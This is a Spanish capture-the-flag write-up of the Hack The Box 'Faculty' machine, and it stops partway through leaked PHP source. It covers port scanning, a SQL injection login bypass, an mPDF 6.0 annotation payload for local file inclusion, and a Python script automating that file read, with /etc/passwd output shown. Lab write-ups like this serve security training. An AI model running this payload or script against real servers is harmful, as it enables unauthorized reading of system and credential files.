<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-faculty-writeup">Hack The Box: Faculty Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Faculty&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.227.208 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.227.208 -&gt; <span style="color:#f92672">[</span>22,80<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80 -sCV 10.129.227.208 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-12 12:28 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.208
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://faculty.htb
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.81 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> 10.129.227.208 -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-12 12:29 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.208
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1495</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>965/udp   closed unknown
</span></span><span style="display:flex;"><span>1046/udp  closed wfremotertm
</span></span><span style="display:flex;"><span>10080/udp closed amanda
</span></span><span style="display:flex;"><span>30932/udp closed unknown
</span></span><span style="display:flex;"><span>49168/udp closed unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.83 seconds
</span></span></code></pre></div><p>Detectamos un dominio,  <code>faculty.htb</code>, lo añadimos al <code>/etc/hosts</code> . Además solo vemos el puerto 80/TCP como punto de entrada.</p>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<p>Vemos que se está utilizando una especie de CMS por detrás.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Fuzzeando el sitio web encontramos un panel de inicio de sesión administrativo en <code>/admin/login.php</code>
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Probando una inyección SQL básica para burlar este panel de autenticación funciona.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<h1 id="local-file-inclusion">Local File Inclusion</h1>
<p>En <code>http://faculty.htb/admin/index.php?page=faculty</code>
Detectamos varios usuarios, vamos a crear una lista de usuarios con estos.
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Además vemos una función para generar reportes en PDF. Esto lo hemos visto en varias máquinas donde quizás, la librería/herramienta utilizándose por detrás para generar estos PDF&rsquo;s tenga alguna vulnerabilidad. Así que vamos a revisar los metadatos
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Le damos click y se nos redirecciona a una URL <code>http://faculty.htb/mpdf/tmp/OKbUpf04MKEJugxPYIiF75kwHz.pdf</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool pdf.pdf 
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.57
</span></span><span style="display:flex;"><span>File Name                       : pdf.pdf
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">1781</span> bytes
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:08:12 10:42:56+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:08:12 12:42:31+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:08:12 12:42:36+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : PDF
</span></span><span style="display:flex;"><span>File Type Extension             : pdf
</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
</span></span><span style="display:flex;"><span>Linearized                      : No
</span></span><span style="display:flex;"><span>Page Count                      : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Page Layout                     : OneColumn
</span></span><span style="display:flex;"><span>Producer                        : mPDF 6.0
</span></span><span style="display:flex;"><span>Create Date                     : 2024:08:12 09:42:56+01:00
</span></span><span style="display:flex;"><span>Modify Date                     : 2024:08:12 09:42:56+01:00
</span></span></code></pre></div><p>En la columna <code>Producer</code> vemos <code>mPDF 6.0</code></p>
<p>Y vemos que existe un LFI asociado a esta herramienta, y que quizás sea vulnerable.
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Revisando el exploit, debemos inyectar un payload el cual en la etiqueta <code>annotation</code> se introduce el nombre del archivo que queremos incluir a la hora de generar el PDF, pero nos preguntamos, ¿Dónde incluimos este payload?</p>
<p>Con <code>burpsuite</code> podemos interceptar las peticiones para hacernos una idea de como funciona por detrás. A la hora de generar el PDF, primero se realiza una petición POST a <code>/admin/download.php</code> con una data.</p>
<p><img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Podemos hacer un <code>base64 -d</code> a esta data y vemos un &ldquo;churro&rdquo; de información URL encodeada dos veces. Con <code>CyberChef</code> podemos decodificar esta información para verla mejor.</p>
<p>Y lo que se tramita es la data en HTML para generar el PDF. Así que podríamos probar a inyectar el payload para el LFI aquí.
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Con <a href="https://www.exploit-db.com/exploits/50995">este PoC</a> generamos el payload.</p>
<p><img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Ahora lo reemplazamos y me el nombre del archivo PDF generado.
<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Lo consultamos y viene un archivo adjunto, lo descargamos&hellip;
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>¡Y tenemos LFI!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /home/pointedsec/Downloads/passwd  | tail -n <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style="display:flex;"><span>mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
</span></span><span style="display:flex;"><span>postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>developer:x:1001:1002:,,,:/home/developer:/bin/bash
</span></span><span style="display:flex;"><span>usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span></code></pre></div><h2 id="automating-the-local-file-inclusion">Automating the Local File Inclusion</h2>
<p>Como el LFI es un poco tedioso, vamos a scriptearlo con Python.</p>
<p>Mientras estaba scripteando el LFI, me dí cuenta de que no se necesita una cookie de sesión como administrador para generar el PDF. Esto aumentaría la criticidad de la vulnerabilidad ya que podríamos conseguir LFI sin estar autenticados.</p>
<p>Este es el script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> PyPDF2
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PyPDF2 <span style="color:#f92672">import</span> PdfReader
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/admin/download.php&#34;</span>
</span></span><span style="display:flex;"><span>PDF_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/mpdf/tmp/&lt;FILENAME&gt;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">def_handler</span>(x,y):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[!] Saliendo&#34;</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;rm temp.pdf&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGINT,def_handler)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_attachment_from_pdf</span>(pdf_file):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(pdf_file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        reader <span style="color:#f92672">=</span> PdfReader(f)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> page_num, page <span style="color:#f92672">in</span> enumerate(reader<span style="color:#f92672">.</span>pages):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;/Annots&#39;</span> <span style="color:#f92672">in</span> page:
</span></span><span style="display:flex;"><span>                annotations <span style="color:#f92672">=</span> page[<span style="color:#e6db74">&#39;/Annots&#39;</span>]
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> annot <span style="color:#f92672">in</span> annotations:
</span></span><span style="display:flex;"><span>                    annot_obj <span style="color:#f92672">=</span> annot<span style="color:#f92672">.</span>get_object()
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;/Subtype&#39;</span> <span style="color:#f92672">in</span> annot_obj <span style="color:#f92672">and</span> annot_obj[<span style="color:#e6db74">&#39;/Subtype&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/FileAttachment&#39;</span>:
</span></span><span style="display:flex;"><span>                        file_spec <span style="color:#f92672">=</span> annot_obj[<span style="color:#e6db74">&#39;/FS&#39;</span>]
</span></span><span style="display:flex;"><span>                        embedded_file <span style="color:#f92672">=</span> file_spec[<span style="color:#e6db74">&#39;/EF&#39;</span>][<span style="color:#e6db74">&#39;/F&#39;</span>]
</span></span><span style="display:flex;"><span>                        file_data <span style="color:#f92672">=</span> embedded_file<span style="color:#f92672">.</span>get_data()
</span></span><span style="display:flex;"><span>                        file_name <span style="color:#f92672">=</span> file_spec[<span style="color:#e6db74">&#39;/F&#39;</span>]
</span></span><span style="display:flex;"><span>                        
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Mostramos el contenido</span>
</span></span><span style="display:flex;"><span>                        print(file_data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload_gen</span>(fname):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&lt;annotation file=&#34;</span><span style="color:#e6db74">{</span>fname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; content=&#34;</span><span style="color:#e6db74">{</span>fname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; icon=&#34;Graph&#34; title=&#34;Attached File: </span><span style="color:#e6db74">{</span>fname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; pos-x=&#34;195&#34; /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>    encoded_payload <span style="color:#f92672">=</span> quote(payload)
</span></span><span style="display:flex;"><span>    base64enc <span style="color:#f92672">=</span> b64encode(encoded_payload<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64enc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_request</span>(file):
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;pdf&#34;</span>: payload_gen(file)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(URL, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lfi</span>():
</span></span><span style="display:flex;"><span>    file <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Archivo: &#34;</span>)
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> PDF_URL<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&lt;FILENAME&gt;&#34;</span>, do_request(file))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Almacenamos el PDF temporalmente</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;temp.pdf&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(r<span style="color:#f92672">.</span>content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    extract_attachment_from_pdf(<span style="color:#e6db74">&#34;temp.pdf&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        lfi()
</span></span></code></pre></div><p>Funcionamiento&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 lfi.py
</span></span><span style="display:flex;"><span>Archivo: /etc/passwd
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style="display:flex;"><span>mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
</span></span><span style="display:flex;"><span>postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>developer:x:1001:1002:,,,:/home/developer:/bin/bash
</span></span><span style="display:flex;"><span>usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span></code></pre></div><p>Vamos a añadir a los usuarios <code>gbyolo</code> y <code>developer</code></p>
<h1 id="foothold">Foothold</h1>
<p>Supongo que existirá una base de datos por detrás, así que mi meta es conseguir estas credenciales para ver si se están reutilizando con algún usuario.</p>
<p>Vamos a cargar el archivo <code>index.php</code> que corresponde a <code>/admin/index.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">session_start</span>(); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;meta content=&#34;width=device-width, initial-scale=1.0&#34; name=&#34;viewport&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;title&gt;School Faculty Scheduling System&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> 	
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  if(!isset($_SESSION[&#39;login_id&#39;]))
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    header(&#39;location:login.php&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> include(&#39;./header.php&#39;); 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> // include(&#39;./auth.php&#39;); 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	body{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        background: #80808045;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  .modal-dialog.large {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    width: 80% !important;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    max-width: unset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  .modal-dialog.mid-large {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    width: 50% !important;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    max-width: unset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  #viewer_modal .btn-close {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    position: absolute;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    z-index: 999999;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    /*right: -4.5em;*/
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    background: unset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    color: white;
